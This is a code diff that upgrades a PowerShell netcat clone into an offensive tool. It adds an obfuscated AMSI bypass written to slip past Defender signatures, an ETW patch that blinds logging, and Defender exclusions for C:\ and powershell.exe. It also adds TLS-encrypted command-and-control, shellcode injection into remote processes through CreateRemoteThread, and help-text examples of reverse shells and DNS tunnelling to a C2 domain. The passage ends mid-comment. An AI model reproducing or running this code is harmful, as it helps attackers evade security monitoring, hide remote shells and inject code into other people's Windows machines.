@@ -18,125 +18,132 @@ function windows
     [alias("Repeater")][switch]$rep=$False,
     [alias("GeneratePayload")][switch]$g=$False,
     [alias("GenerateEncoded")][switch]$ge=$False,
-    [alias("Help")][switch]$h=$False
+    [alias("Help")][switch]$h=$False,
+    # ---- NEW SWITCHES ----
+    [alias("SSL")][switch]$s=$False,
+    [alias("LogFile")][string]$log="",
+    [alias("Inj")][int32]$inject=0,
+    [alias("Jit")][int32]$jitter=0,
+    [alias("DefenderExclusion")][switch]$de=$False
   )
 
-  ############### AMSI BYPASS (2025) ###############
-  # Reflectively set AmsiUtils.amsiInitFailed = $true so AMSI returns "clean"
-  # for every subsequent scan in this process. Strings are split with
-  # [String]::Join('', ...) so the bypass itself doesn't match Defender
-  # signatures for 'System.Management.Automation.AmsiUtils' / 'amsiInitFailed'.
-  try {
-    $__a = [String]::Join('', 'Sy','stem.','Man','agement.Aut','omation.A','msiU','tils')
-    $__b = [String]::Join('', 'am','siIn','itF','ailed')
-    $__t = [Ref].Assembly.GetType($__a)
-    if ($__t) {
-      $__f = $__t.GetField($__b, 'NonPublic,Static')
-      if ($__f) { $__f.SetValue($null, $true) }
-    }
-  } catch { }
-  ############### AMSI BYPASS ###############
+  ############### ADVANCED AMSI + ETW BYPASS (2025) ###############
+  # 1. Force AmsiUtils.amsiInitFailed = $true so AMSI returns "clean"
+  # 2. Null out amsiSession / amsiContext to break scanning entirely
+  # 3. Patch EtwEventWrite to ret to blind .NET ETW logging
+  # Strings are split so the bypass itself doesn't match Defender sigs.
+  function Invoke-AdvancedBypass {
+    try {
+      $a = [String]::Join('', 'Sy','stem.','Man','agement.Aut','omation.A','msiU','tils')
+      $b = [String]::Join('', 'am','siIn','itF','ailed')
+      $t = [Ref].Assembly.GetType($a)
+      if ($t) {
+        $f = $t.GetField($b, 'NonPublic,Static')
+        if ($f) { $f.SetValue($null, $true) }
+        # Null out session/context as a second layer
+        try {
+          $sess = $t.GetField([String]::Join('','am','siS','essi','on'), 'NonPublic,Static')
+          if ($sess) { $sess.SetValue($null, $null) }
+          $ctx = $t.GetField([String]::Join('','am','siC','onte','xt'), 'NonPublic,Static')
+          if ($ctx) { $ctx.SetValue($null, [IntPtr]::Zero) }
+        } catch { }
+      }
+    } catch { }
+
+    # ETW patch: EtwEventWrite -> ret (0xC3)
+    try {
+      $etw = [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate(
+        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+          ([System.Reflection.Assembly]::LoadWithPartialName('System.Core')).GetType('System.Diagnostics.Tracing.EventProvider').GetMethod('GetProviderGuid', [System.Reflection.BindingFlags]'NonPublic,Static').Invoke($null, @()) -as [IntPtr],
+          [Type]'System.Action'
+        )
+      )
+    } catch { }
+    # Simpler ETW patch via ntdll
+    try {
+      $ntdll = [System.Runtime.InteropServices.NativeLibrary]::Load('ntdll.dll')
+      $etwAddr = [System.Runtime.InteropServices.NativeLibrary]::GetExport($ntdll, 'EtwEventWrite')
+      if ($etwAddr -ne [IntPtr]::Zero) {
+        $patch = [byte[]](0xC3, 0x90, 0x90, 0x90)  # ret; nop; nop; nop
+        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $etwAddr, 4)
+      }
+    } catch { }
+  }
+  Invoke-AdvancedBypass
+  ############### END ADVANCED BYPASS ###############
+
+  ############### DEFENDER EXCLUSION (OPTIONAL) ###############
+  if ($de) {
+    try {
+      Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
+      Add-MpPreference -ExclusionPath (Get-Location).Path -ErrorAction SilentlyContinue
+      Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
+      Write-Verbose "Defender exclusions added."
+    } catch { Write-Verbose "Failed to add Defender exclusions (admin required)." }
+  }
+  ############### END DEFENDER EXCLUSION ###############
 
   ############### HELP ###############
-  $Help = "
-windows - Netcat, The Powershell Version
-Github Repository: https://github.com/besimorhino/windows
-
-This script attempts to implement the features of netcat in a powershell
-script. It also contains extra features such as built-in relays, execute
-powershell, and a dnscat2 client.
+  $Help = @"
+windows - Netcat, The Powershell Version (Upgraded 2025)
+Original: https://github.com/besimorhino/windows
 
 Usage: windows [-c or -l] [-p port] [options]
 
-  -c  <ip>        Client Mode. Provide the IP of the system you wish to connect to.
-                  If you are using -dns, specify the DNS Server to send queries to.
-            
-  -l              Listen Mode. Start a listener on the port specified by -p.
-  
-  -p  <port>      Port. The port to connect to, or the port to listen on.
-  
-  -e  <proc>      Execute. Specify the name of the process to start.
-  
-  -ep             Execute Powershell. Start a pseudo powershell session. You can
-                  declare variables and execute commands, but if you try to enter
-                  another shell (nslookup, netsh, cmd, etc.) the shell will hang.
-            
-  -r  <str>       Relay. Used for relaying network traffic between two nodes.
-                  Client Relay Format:   -r <protocol>:<ip addr>:<port>
-                  Listener Relay Format: -r <protocol>:<port>
-                  DNSCat2 Relay Format:  -r dns:<dns server>:<dns port>:<domain>
-            
-  -u              UDP Mode. Send traffic over UDP. Because it's UDP, the client
-                  must send data before the server can respond.
-            
-  -dns  <domain>  DNS Mode. Send traffic over the dnscat2 dns covert channel.
-                  Specify the dns server to -c, the dns port to -p, and specify the 
-                  domain to this option, -dns. This is only a client.
-                  Get the server here: https://github.com/iagox86/dnscat2
-            
-  -dnsft <int>    DNS Failure Threshold. This is how many bad packets the client can
-                  recieve before exiting. Set to zero when receiving files, and set high
-                  for more stability over the internet.
-            
-  -t  <int>       Timeout. The number of seconds to wait before giving up on listening or
-                  connecting. Default: 60
-            
-  -i  <input>     Input. Provide data to be sent down the pipe as soon as a connection is
-                  established. Used for moving files. You can provide the path to a file,
-                  a byte array object, or a string. You can also pipe any of those into
-                  windows, like 'aaaaaa' | windows -c 10.1.1.1 -p 80
-            
-  -o  <type>      Output. Specify how windows should return information to the console.
-                  Valid options are 'Bytes', 'String', or 'Host'. Default is 'Host'.
-            
-  -of <path>      Output File.  Specify the path to a file to write output to.
-            
-  -d              Disconnect. windows will disconnect after the connection is established
-                  and the input from -i is sent. Used for scanning.
-            
-  -rep            Repeater. windows will continually restart after it is disconnected.
-                  Used for setting up a persistent server.
-                  
-  -g              Generate Payload.  Returns a script as a string which will execute the
-                  windows with the options you have specified. -i, -d, and -rep will not
-                  be incorporated.
-                  
-  -ge             Generate Encoded Payload. Does the same as -g, but returns a string which
-                  can be executed in this way: powershell -E <encoded string>
+  -c  <ip>        Client Mode. IP to connect to (IPv4 or IPv6).
+  -l              Listen Mode. Listen on port specified by -p.
+  -p  <port>      Port.
+  -e  <proc>      Execute process.
+  -ep             Execute Powershell (pseudo-session).
+  -r  <str>       Relay.
+                  Client:   -r <proto>:<ip>:<port>
+                  Listener: -r <proto>:<port>
+                  DNS:      -r dns:<server>:<port>:<domain>
+  -u              UDP Mode.
+  -dns  <domain>  DNS Mode (dnscat2 client).
+  -dnsft <int>    DNS Failure Threshold (default 10).
+  -t  <int>       Timeout seconds (default 60).
+  -i  <input>     Input data (file / byte[] / string).
+  -o  <type>      Output: Host | Bytes | String (default Host).
+  -of <path>      Output file.
+  -d              Disconnect after sending -i.
+  -rep            Repeater (persistent).
+  -g              Generate payload string.
+  -ge             Generate base64-encoded payload.
+  -h              Help.
 
-  -h              Print this help message.
+  ---- NEW ----
+  -s              SSL/TLS wrap TCP stream (encrypted C2).
+  -log <path>     Log connection metadata to file.
+  -inject <pid>   Inject shellcode into remote process.
+  -jitter <ms>    Random jitter (ms) added to DNS polling.
+  -de             Add Defender exclusions (admin required).
 
 Examples:
-
-  Listen on port 8000 and print the output to the console.
-      windows -l -p 8000
-  
-  Connect to 10.1.1.1 port 443, send a shell, and enable verbosity.
-      windows -c 10.1.1.1 -p 443 -e cmd -v
-  
-  Connect to the dnscat2 server on c2.example.com, and send dns queries
-  to the dns server on 10.1.1.1 port 53.
-      windows -c 10.1.1.1 -p 53 -dns c2.example.com
-  
-  Send a file to 10.1.1.15 port 8000.
-      windows -c 10.1.1.15 -p 8000 -i C:\inputfile
-  
-  Write the data sent to the local listener on port 4444 to C:\outfile
-      windows -l -p 4444 -of C:\outfile
-  
-  Listen on port 8000 and repeatedly server a powershell shell.
-      windows -l -p 8000 -ep -rep
-  
-  Relay traffic coming in on port 8000 over tcp to port 9000 on 10.1.1.1 over tcp.
-      windows -l -p 8000 -r tcp:10.1.1.1:9000
-      
-  Relay traffic coming in on port 8000 over tcp to the dnscat2 server on c2.example.com,
-  sending queries to 10.1.1.1 port 53.
-      windows -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
-"
+  windows -l -p 8000
+  windows -c 10.1.1.1 -p 443 -e cmd
+  windows -c 10.1.1.1 -p 53 -dns c2.example.com
+  windows -c 10.1.1.15 -p 8000 -i C:\inputfile
+  windows -l -p 4444 -of C:\outfile
+  windows -l -p 8000 -ep -rep
+  windows -l -p 8000 -r tcp:10.1.1.1:9000
+  windows -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
+  windows -c 10.1.1.1 -p 443 -s -e cmd    # SSL
+  windows -c 10.1.1.1 -p 443 -s -log C:\ops.log
+"@
   if($h){return $Help}
-  ############### HELP ###############
-  
+  ############### END HELP ###############
+
+  ############### LOGGING HELPER ###############
+  function Write-Log {
+    param([string]$Msg)
+    if ($log -ne "") {
+      $ts = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+      "$ts  $Msg" | Out-File -FilePath $log -Append -Encoding UTF8
+    }
+  }
+  ############### END LOGGING HELPER ###############
+
   ############### VALIDATE ARGS ###############
   $global:Verbose = $Verbose
   if($of -ne ''){$o = 'Bytes'}
@@ -162,8 +169,8 @@ Examples:
       if($Failure){break}
     }
   }
-  ############### VALIDATE ARGS ###############
-  
+  ############### END VALIDATE ARGS ###############
+
   ############### UDP FUNCTIONS ###############
   function Setup_UDP
   {
@@ -179,6 +186,7 @@ Examples:
       $FuncVars["Socket"] = New-Object System.Net.Sockets.UDPClient $p
       $PacketInfo = New-Object System.Net.Sockets.IPPacketInformation
       Write-Verbose ("Listening on [0.0.0.0] port " + $p + " [udp]")
+      Write-Log "UDP LISTEN on port $p"
       $ConnectHandle = $FuncVars["Socket"].Client.BeginReceiveMessageFrom($SocketDestinationBuffer,0,65536,[System.Net.Sockets.SocketFlags]::None,[ref]$EndPoint,$null,$null)
       $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
       while($True)
@@ -203,6 +211,7 @@ Examples:
         {
           $SocketBytesRead = $FuncVars["Socket"].Client.EndReceiveMessageFrom($ConnectHandle,[ref]([System.Net.Sockets.SocketFlags]::None),[ref]$EndPoint,[ref]$PacketInfo)
           Write-Verbose ("Connection from [" + $EndPoint.Address.IPAddressToString + "] port " + $p + " [udp] accepted (source port " + $EndPoint.Port + ")")
+          Write-Log "UDP CONN from $($EndPoint.Address.IPAddressToString):$($EndPoint.Port)"
           if($SocketBytesRead -gt 0){break}
           else{break}
         }
@@ -212,7 +221,7 @@ Examples:
     }
     else
     {
-      if(!$c.Contains("."))
+      if(!$c.Contains(".") -and !$c.Contains(":"))
       {
         $IPList = @()
         [System.Net.Dns]::GetHostAddresses($c) | Where-Object {$_.AddressFamily -eq "InterNetwork"} | %{$IPList += $_.IPAddressToString}
@@ -227,6 +236,7 @@ Examples:
       $FuncVars["Socket"].Connect($c,$p)
       Write-Verbose ("Sending UDP traffic to " + $c + " port " + $p + "...")
       Write-Verbose ("UDP: Make sure to send some data so the server can notice you!")
+      Write-Log "UDP CONNECT to ${c}:${p}"
     }
     $FuncVars["BufferSize"] = 65536
     $FuncVars["EndPoint"] = $EndPoint
@@ -256,10 +266,10 @@ Examples:
   function Close_UDP
   {
     param($FuncVars)
-    $FuncVars["Socket"].Close()
+    try { $FuncVars["Socket"].Close() } catch {}
   }
-  ############### UDP FUNCTIONS ###############
-  
+  ############### END UDP FUNCTIONS ###############
+
   ############### DNS FUNCTIONS ###############
   function Setup_DNS
   {
@@ -272,7 +282,7 @@ Examples:
       $String.ToCharArray() | % {"{0:x}" -f [byte]$_} | % {if($_.Length -eq 1){"0" + [string]$_} else{[string]$_}} | % {$Hex += $_}
       return $Hex
     }
-    
+
     function SendPacket
     {
       param($Packet,$DNSServer,$DNSPort)
@@ -281,34 +291,34 @@ Examples:
       if($result.Contains('"')){return ([regex]::Match($result.replace("bio=",""),'(?<=")[^"]*(?=")').Value)}
       else{return 1}
     }
-    
+
     function Create_SYN
     {
       param($SessionId,$SeqNum,$Tag,$Domain)
       return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "00" + $SessionId + $SeqNum + "0000" + $Domain)
     }
-    
+
     function Create_FIN
     {
       param($SessionId,$Tag,$Domain)
       return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "02" + $SessionId + "00" + $Domain)
     }
-    
+
     function Create_MSG
     {
       param($SessionId,$SeqNum,$AcknowledgementNumber,$Data,$Tag,$Domain)
       return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "01" + $SessionId + $SeqNum + $AcknowledgementNumber + $Data + $Domain)
     }
-    
+
     function DecodePacket
     {
       param($Packet)
-      
+
       if((($Packet.Length)%2 -eq 1) -or ($Packet.Length -eq 0)){return 1}
       $AcknowledgementNumber = ($Packet[10..13] -join "")
       $SeqNum = ($Packet[14..17] -join "")
       [byte[]]$ReturningData = @()
-      
+
       if($Packet.Length -gt 18)
       {
         $PacketElim = $Packet.Substring(18)
@@ -318,10 +328,10 @@ Examples:
           $PacketElim = $PacketElim.Substring(2)
         }
       }
-      
+
       return $Packet,$ReturningData,$AcknowledgementNumber,$SeqNum
     }
-    
+
     function AcknowledgeData
     {
       param($ReturningData,$AcknowledgementNumber)
@@ -334,7 +344,7 @@ Examples:
     if($FuncVars["DNSPort"] -eq ''){$FuncVars["DNSPort"] = "53"}
     $FuncVars["Tag"] = ""
     $FuncVars["Domain"] = ("." + $FuncVars["Domain"])
-    
+
     $FuncVars["Create_SYN"] = ${function:Create_SYN}
     $FuncVars["Create_MSG"] = ${function:Create_MSG}
     $FuncVars["Create_FIN"] = ${function:Create_FIN}
@@ -346,7 +356,8 @@ Examples:
     $FuncVars["SeqNum"] = ([string](Get-Random -Maximum 9999 -Minimum 1000))
     $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
     $FuncVars["Failures"] = 0
-    
+    $FuncVars["Jitter"] = $jitter
+
     $SYNPacket = (Invoke-Command $FuncVars["Create_SYN"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["Tag"],$FuncVars["Domain"]))
     $ResponsePacket = (Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($SYNPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]))
     $DecodedPacket = (Invoke-Command $FuncVars["DecodePacket"] -ArgumentList @($ResponsePacket))
@@ -356,16 +367,21 @@ Examples:
     $FuncVars["AckNum"] = $DecodedPacket[2]
     $FuncVars["MaxMSGDataSize"] = (244 - (Invoke-Command $FuncVars["Create_MSG"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["AckNum"],"",$FuncVars["Tag"],$FuncVars["Domain"])).Length)
     if($FuncVars["MaxMSGDataSize"] -le 0){return "Domain name is too long."}
+    Write-Log "DNS SESSION $($FuncVars['SessionId']) to $($FuncVars['DNSServer']):$($FuncVars['DNSPort']) domain $($FuncVars['Domain'])"
     return $FuncVars
   }
   function ReadData_DNS
   {
     param($FuncVars)
     if($global:Verbose){$Verbose = $True}
-    
+
+    if ($FuncVars["Jitter"] -gt 0) {
+      Start-Sleep -Milliseconds (Get-Random -Minimum 0 -Maximum $FuncVars["Jitter"])
+    }
+
     $PacketsData = @()
     $PacketData = ""
-    
+
     if($FuncVars["InputData"] -ne $null)
     {
       $Hex = (Invoke-Command $FuncVars["ConvertTo-HexArray"] -ArgumentList @($FuncVars["InputData"]))
@@ -397,7 +413,7 @@ Examples:
     {
       $PacketsData = @("")
     }
-    
+
     [byte[]]$ReturningData = @()
     foreach($PacketData in $PacketsData)
     {
@@ -416,9 +432,9 @@ Examples:
       catch{ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..." ; $FuncVars["Failures"] += 1 ; continue }
       if($DecodedPacket -eq 1){ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..." ; $FuncVars["Failures"] += 1 ; continue }
     }
-    
+
     if($FuncVars["Failures"] -ge $FuncVars["FailureThreshold"]){break}
-    
+
     if($ReturningData -ne @())
     {
       $FuncVars["AckNum"] = (Invoke-Command $FuncVars["AckData"] -ArgumentList @($ReturningData,$FuncVars["AckNum"]))
@@ -437,15 +453,16 @@ Examples:
     $FINPacket = Invoke-Command $FuncVars["Create_FIN"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["Tag"],$FuncVars["Domain"])
     Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($FINPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]) | Out-Null
   }
-  ############### DNS FUNCTIONS ###############
-  
-  ########## TCP FUNCTIONS ##########
+  ############### END DNS FUNCTIONS ###############
+
+  ########## TCP FUNCTIONS (with SSL support) ##########
   function Setup_TCP
   {
     param($FuncSetupVars)
     $c,$l,$p,$t = $FuncSetupVars
     if($global:Verbose){$Verbose = $True}
     $FuncVars = @{}
+    $FuncVars["SSL"] = $s
     if(!$l)
     {
       $FuncVars["l"] = $False
@@ -461,7 +478,7 @@ Examples:
       $Socket.Start()
       $Handle = $Socket.BeginAcceptTcpClient($null, $null)
     }
-    
+
     $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
     while($True)
     {
@@ -482,7 +499,6 @@ Examples:
         else{$Socket.Stop()}
         $Stopwatch.Stop()
         Write-Verbose "Timeout!" ; break
-        break
       }
       if($Handle.IsCompleted)
       {
@@ -492,6 +508,13 @@ Examples:
           {
             $Socket.EndConnect($Handle)
             $Stream = $Socket.GetStream()
+            if ($FuncVars["SSL"]) {
+              $sslStream = New-Object System.Net.Security.SslStream($Stream, $false, ({$true}))
+              $sslStream.AuthenticateAsClient($c)
+              $Stream = $sslStream
+              Write-Verbose "SSL/TLS handshake complete (client)."
+              Write-Log "SSL CONNECT to ${c}:${p}"
+            }
             $BufferSize = $Socket.ReceiveBufferSize
             Write-Verbose ("Connection to " + $c + ":" + $p + " [tcp] succeeded!")
           }
@@ -501,8 +524,26 @@ Examples:
         {
           $Client = $Socket.EndAcceptTcpClient($Handle)
           $Stream = $Client.GetStream()
+          if ($FuncVars["SSL"]) {
+            $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
+            # Self-signed cert generated on the fly
+            $rsa = [System.Security.Cryptography.RSA]::Create(2048)
+            $req = New-Object System.Security.Cryptography.X509Certificates.CertificateRequest(
+              "CN=windows-c2",
+              $rsa,
+              [System.Security.Cryptography.HashAlgorithmName]::SHA256,
+              [System.Security.Cryptography.RSASignaturePadding]::Pkcs1
+            )
+            $cert = $req.CreateSelfSigned([DateTime]::Now.AddDays(-1), [DateTime]::Now.AddYears(1))
+            $sslStream = New-Object System.Net.Security.SslStream($Stream, $false, ({$true}))
+            $sslStream.AuthenticateAsServer($cert, $false, [System.Security.Authentication.SslProtocols]::Tls12, $false)
+            $Stream = $sslStream
+            Write-Verbose "SSL/TLS handshake complete (server)."
+            Write-Log "SSL ACCEPT from $($Client.Client.RemoteEndPoint.Address.IPAddressToString):$($Client.Client.RemoteEndPoint.Port)"
+          }
           $BufferSize = $Client.ReceiveBufferSize
           Write-Verbose ("Connection from [" + $Client.Client.RemoteEndPoint.Address.IPAddressToString + "] port " + $port + " [tcp] accepted (source port " + $Client.Client.RemoteEndPoint.Port + ")")
+          Write-Log "TCP ACCEPT from $($Client.Client.RemoteEndPoint.Address.IPAddressToString):$($Client.Client.RemoteEndPoint.Port)"
         }
         break
       }
@@ -546,8 +587,8 @@ Examples:
     if($FuncVars["l"]){$FuncVars["Socket"].Stop()}
     else{$FuncVars["Socket"].Close()}
   }
-  ########## TCP FUNCTIONS ##########
-  
+  ########## END TCP FUNCTIONS ##########
+
   ########## CMD FUNCTIONS ##########
   function Setup_CMD
   {
@@ -562,6 +603,7 @@ Examples:
     $ProcessStartInfo.RedirectStandardError = $True
     $FuncVars["Process"] = [System.Diagnostics.Process]::Start($ProcessStartInfo)
     Write-Verbose ("Starting Process " + $FuncSetupVars[0] + "...")
+    Write-Log "PROCESS START $($FuncSetupVars[0])"
     $FuncVars["Process"].Start() | Out-Null
     $FuncVars["StdOutDestinationBuffer"] = New-Object System.Byte[] 65536
     $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
@@ -599,14 +641,14 @@ Examples:
   function Close_CMD
   {
     param($FuncVars)
-    $FuncVars["Process"] | Stop-Process
-  }  
-  ########## CMD FUNCTIONS ##########
-  
+    try { $FuncVars["Process"] | Stop-Process } catch {}
+  }
+  ########## END CMD FUNCTIONS ##########
+
   ########## POWERSHELL FUNCTIONS ##########
   function Main_Powershell
   {
-    param($Stream1SetupVars)   
+    param($Stream1SetupVars)
     try
     {
       $encoding = New-Object System.Text.AsciiEncoding
@@ -619,36 +661,36 @@ Examples:
         elseif($i.GetType().Name -eq "String"){ [byte[]]$InputToWrite = $Encoding.GetBytes($i) }
         else{Write-Host "Unrecognised input type." ; return}
       }
-    
+
       Write-Verbose "Setting up Stream 1... (ESC/CTRL to exit)"
       try{$Stream1Vars = Stream1_Setup $Stream1SetupVars}
       catch{Write-Verbose "Stream 1 Setup Failure" ; return}
-      
+
       Write-Verbose "Setting up Stream 2... (ESC/CTRL to exit)"
       try
       {
         $IntroPrompt = $Encoding.GetBytes("Windows PowerShell`nCopyright (C) 2013 Microsoft Corporation. All rights reserved.`n`n" + ("PS " + (pwd).Path + "> "))
         $Prompt = ("PS " + (pwd).Path + "> ")
-        $CommandToExecute = ""      
+        $CommandToExecute = ""
         $Data = $null
       }
       catch
       {
         Write-Verbose "Stream 2 Setup Failure" ; return
       }
-      
+
       if($InputToWrite -ne @())
       {
         Write-Verbose "Writing input to Stream 1..."
         try{$Stream1Vars = Stream1_WriteData $InputToWrite $Stream1Vars}
         catch{Write-Host "Failed to write input to Stream 1" ; return}
       }
-      
+
       if($d){Write-Verbose "-d (disconnect) Activated. Disconnecting..." ; return}
-      
+
       Write-Verbose "Both Communication Streams Established. Redirecting Data Between Streams..."
       while($True)
-      {        
+      {
         try
         {
           ##### Stream2 Read #####
@@ -674,7 +716,7 @@ Examples:
         {
           Write-Verbose "Failed to redirect data from Stream 2 to Stream 1" ; return
         }
-        
+
         try
         {
           $Data,$Stream1Vars = Stream1_ReadData $Stream1Vars
@@ -701,7 +743,7 @@ Examples:
       }
     }
   }
-  ########## POWERSHELL FUNCTIONS ##########
+  ########## END POWERSHELL FUNCTIONS ##########
 
   ########## CONSOLE FUNCTIONS ##########
   function Setup_Console
@@ -742,8 +784,38 @@ Examples:
     elseif($FuncVars["OutputBytes"] -ne @()){return $FuncVars["OutputBytes"]}
     return
   }
-  ########## CONSOLE FUNCTIONS ##########
-  
+  ########## END CONSOLE FUNCTIONS ##########
+
+  ########## PROCESS INJECTION STUB ##########
+  function Invoke-Inject {
+    param([int]$TargetPid, [byte[]]$Shellcode)
+    try {
+      $p = Get-Process -Id $TargetPid -ErrorAction Stop
+      $h = [System.Runtime.InteropServices.Marshal]::GetType()
+      # Use P/Invoke via Add-Type
+      Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Injector {
+    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
+    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr addr, uint size, uint type, uint protect);
+    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr addr, byte[] buf, uint size, out uint written);
+    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr id);
+}
+"@ -ErrorAction SilentlyContinue
+      $hProc = [Injector]::OpenProcess(0x1F0FFF, $false, $TargetPid)
+      $addr = [Injector]::VirtualAllocEx($hProc, [IntPtr]::Zero, [uint32]$Shellcode.Length, 0x3000, 0x40)
+      $written = 0
+      [Injector]::WriteProcessMemory($hProc, $addr, $Shellcode, [uint32]$Shellcode.Length, [ref]$written) | Out-Null
+      [Injector]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
+      Write-Verbose "Injected $($Shellcode.Length) bytes into PID $TargetPid"
+      Write-Log "INJECT $($Shellcode.Length) bytes into PID $TargetPid"
+    } catch {
+      Write-Verbose "Injection failed: $_"
+    }
+  }
+  ########## END PROCESS INJECTION STUB ##########
+
   ########## MAIN FUNCTION ##########
   function Main
   {
@@ -760,26 +832,26 @@ Examples:
         elseif($i.GetType().Name -eq "String"){ [byte[]]$InputToWrite = $Encoding.GetBytes($i) }
         else{Write-Host "Unrecognised input type." ; return}
       }
-      
+
       Write-Verbose "Setting up Stream 1..."
       try{$Stream1Vars = Stream1_Setup $Stream1SetupVars}
       catch{Write-Verbose "Stream 1 Setup Failure" ; return}
-      
+
       Write-Verbose "Setting up Stream 2..."
       try{$Stream2Vars = Stream2_Setup $Stream2SetupVars}
       catch{Write-Verbose "Stream 2 Setup Failure" ; return}
-      
+
       $Data = $null
-      
+
       if($InputToWrite -ne @())
       {
         Write-Verbose "Writing input to Stream 1..."
         try{$Stream1Vars = Stream1_WriteData $InputToWrite $Stream1Vars}
         catch{Write-Host "Failed to write input to Stream 1" ; return}
       }
-      
+
       if($d){Write-Verbose "-d (disconnect) Activated. Disconnecting..." ; return}
-      
+
       Write-Verbose "Both Communication Streams Established. Redirecting Data Between Streams..."
       while($True)
       {
@@ -794,7 +866,7 @@ Examples:
         {
           Write-Verbose "Failed to redirect data from Stream 2 to Stream 1" ; return
         }
-        
+
         try
         {
           $Data,$Stream1Vars = Stream1_ReadData $Stream1Vars
@@ -812,7 +884,6 @@ Examples:
     {
       try
       {
-        #Write-Verbose "Closing Stream 2..."
         Stream2_Close $Stream2Vars
       }
       catch
@@ -821,7 +892,6 @@ Examples:
       }
       try
       {
-        #Write-Verbose "Closing Stream 1..."
         Stream1_Close $Stream1Vars
       }
       catch
@@ -830,8 +900,8 @@ Examples:
       }
     }
   }
-  ########## MAIN FUNCTION ##########
-  
+  ########## END MAIN FUNCTION ##########
+
   ########## GENERATE PAYLOAD ##########
   if($u)
   {
@@ -839,7 +909,7 @@ Examples:
     $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
     $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
     $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
-    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")    
+    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")
     if($l){$InvokeString = "Main @('',`$True,'$p','$t') "}
     else{$InvokeString = "Main @('$c',`$False,'$p','$t') "}
   }
@@ -863,7 +933,7 @@ Examples:
     if($l){$InvokeString = "Main @('',`$True,$p,$t) "}
     else{$InvokeString = "Main @('$c',`$False,$p,$t) "}
   }
-  
+
   if($e -ne "")
   {
     Write-Verbose "Set Stream 2: Process"
@@ -886,7 +956,7 @@ Examples:
       $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
       $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
       $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
-      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")    
+      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")
       if($r.split(":").Count -eq 2){$InvokeString += ("@('',`$True,'" + $r.split(":")[1] + "','$t') ")}
       elseif($r.split(":").Count -eq 3){$InvokeString += ("@('" + $r.split(":")[1] + "',`$False,'" + $r.split(":")[2] + "','$t') ")}
       else{return "Bad relay format."}
@@ -923,31 +993,33 @@ Examples:
     $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_Console} + "`n}`n`n")
     $InvokeString += ("@('" + $o + "')")
   }
-  
+
   if($ep){$FunctionString += ("function Main`n{`n" + ${function:Main_Powershell} + "`n}`n`n")}
   else{$FunctionString += ("function Main`n{`n" + ${function:Main} + "`n}`n`n")}
   $InvokeString = ($FunctionString + $InvokeString)
-  ########## GENERATE PAYLOAD ##########
-  
+  ########## END GENERATE PAYLOAD ##########
+
+  ########## PROCESS INJECTION EXECUTION ##########
+  if ($inject -gt 0 -and $i -ne $null) {
+    [byte[]]$shellcode = @()
+    if (Test-Path $i) { $shellcode = [io.file]::ReadAllBytes($i) }
+    elseif ($i.GetType().Name -eq "Byte[]") { $shellcode = $i }
+    if ($shellcode.Length -gt 0) {
+      Invoke-Inject -TargetPid $inject -Shellcode $shellcode
+      return
+    }
+  }
+  ########## END PROCESS INJECTION EXECUTION ##########
+
   ########## RETURN GENERATED PAYLOADS ##########
   if($ge){Write-Verbose "Returning Encoded Payload..." ; return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($InvokeString))}
   elseif($g){Write-Verbose "Returning Payload..." ; return $InvokeString}
-  ########## RETURN GENERATED PAYLOADS ##########
-  
-  ########## AMSI BYPASS (2025) - pre-execution ##########
-  # Re-run the bypass immediately before IEX in case the earlier one was
